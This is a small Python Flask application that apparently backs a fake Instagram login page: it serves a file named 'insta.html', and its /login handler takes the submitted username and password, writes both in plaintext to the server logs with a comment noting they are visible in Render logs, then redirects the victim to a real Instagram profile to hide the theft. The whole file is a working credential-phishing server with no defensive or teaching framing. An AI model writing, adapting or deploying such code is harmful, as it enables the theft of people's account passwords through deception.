from flask import Flask, request, redirect
import logging
import os

app = Flask(__name__)

# Enable logging to capture login attempts
logging.basicConfig(level=logging.INFO)

@app.route('/')
def home():
    # Serve the HTML file directly
    with open(os.path.join(os.path.dirname(__file__), 'insta.html'), 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Log credentials (visible in Render logs)
    app.logger.info(f"Login attempt - Username: {username}, Password: {password}")

    # Redirect to Instagram page
    return redirect("https://www.instagram.com/ex.clothi/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)




